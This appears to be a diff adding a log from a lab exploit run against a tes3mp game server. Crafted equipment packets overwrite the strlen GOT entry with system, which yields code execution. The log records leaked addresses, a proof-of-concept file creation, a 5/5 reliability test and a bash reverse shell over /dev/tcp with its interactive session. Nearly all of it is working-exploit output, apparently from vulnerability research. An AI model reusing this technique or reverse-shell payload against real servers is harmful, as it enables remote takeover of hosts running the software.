@@ -1,0 +1,53 @@
+build=0
+binbase=0x5a2b6872f000 strlen@got=0x5a2b689f21f8
+=== fsop ===
+[p21] PIE=0x5a2b6872f000 libc=0x7e7e3bc00000 system=0x7e7e3bc58750 strlen@got=0x5a2b689f21f8
+[p21] trigger packet sent: item7 -> GOT=system, item5 -> strlen("touch /tmp/lab-poc-rce-proof") == system(payload)
+=== all system() calls ===
+grep: /tmp/rd.log: binary file matches
+>>> SYSTEM rdi="touch /tmp/lab-poc-rce-proof"
+=== got + crash ===
+BEFORE: *(strlen@got)=0x7e7e3bd9bac0
+Thread 1 "tes3mp-server.x" received signal SIGSEGV, Segmentation fault.
+AFTER: *(strlen@got)=0x7e7e3bc58750
+#0  0x00005a2b688db890 in RakNet::HuffmanEncodingTree::EncodeArray(unsigned char*, unsigned long, RakNet::BitStream*) ()
+#1  0x00005a2b688d73e7 in RakNet::StringCompressor::EncodeString(char const*, unsigned long, RakNet::BitStream*, unsigned char) ()
+#2  0x00005a2b688c7422 in RakNet::RakString::SerializeCompressed(char const*, RakNet::BitStream*, unsigned char, bool) ()
+#3  0x00005a2b68940a91 in mwmp::PacketPlayerEquipment::ExchangeItemInformation(mwmp::Item&, bool) ()
+#4  0x00005a2b68941043 in mwmp::PacketPlayerEquipment::Packet(RakNet::BitStream*, bool) ()
+#5  0x00005a2b6892a6c0 in mwmp::BasePacket::Send(RakNet::AddressOrGUID) ()
+=== MARKER: EXISTS *** CODE EXECUTION *** ===
+-rw-rw-r-- 1 fuzzer fuzzer 0 Aug 17 19:01 /tmp/lab-poc-rce-proof
+
+===== COLD START RELIABILITY =====
+run 1: *** EXEC *** fuzzer 2026-08-17 19:03:27.780
+run 2: *** EXEC *** fuzzer 2026-08-17 19:04:01.932
+run 3: *** EXEC *** fuzzer 2026-08-17 19:04:36.111
+run 4: *** EXEC *** fuzzer 2026-08-17 19:05:10.287
+run 5: *** EXEC *** fuzzer 2026-08-17 19:05:44.461
+=== COLD-START RELIABILITY: 5/5 ===
+
+===== REVERSE SHELL =====
+/tmp/revsh.sh: line 4: 2809983 Killed                  sudo pkill -9 -f "nc -lvnp $LPORT" 2> /dev/null
+payload: /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' &
+[p21] PIE=0x5654d8cba000 libc=0x7a9877000000 system=0x7a9877058750 strlen@got=0x5654d8f7d1f8
+[p21] trigger packet sent: item7 -> GOT=system, item5 -> strlen("/bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' &") == system(payload)
+=== waiting for shell session ===
+=== REVERSE SHELL SESSION OUTPUT ===
+Listening on 0.0.0.0 4444
+Connection received on 127.0.0.1 35704
+bash: cannot set terminal process group (2809995): Inappropriate ioctl for device
+bash: no job control in this shell
+fuzzer@fuzz-1:~/tes3mp/target-release$ id
+uid=999(fuzzer) gid=988(fuzzer) groups=988(fuzzer)
+fuzzer@fuzz-1:~/tes3mp/target-release$ hostname
+fuzz-1
+fuzzer@fuzz-1:~/tes3mp/target-release$ pwd
+/srv/fuzz/tes3mp/target-release
+fuzzer@fuzz-1:~/tes3mp/target-release$ ps -o pid,comm -p $PPID
+    PID COMMAND
+2810010 bash
+fuzzer@fuzz-1:~/tes3mp/target-release$ uname -a
+Linux fuzz-1 6.8.0-136-generic #136-Ubuntu SMP PREEMPT_DYNAMIC Wed Jul  1 21:53:05 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+fuzzer@fuzz-1:~/tes3mp/target-release$ exit
+exit
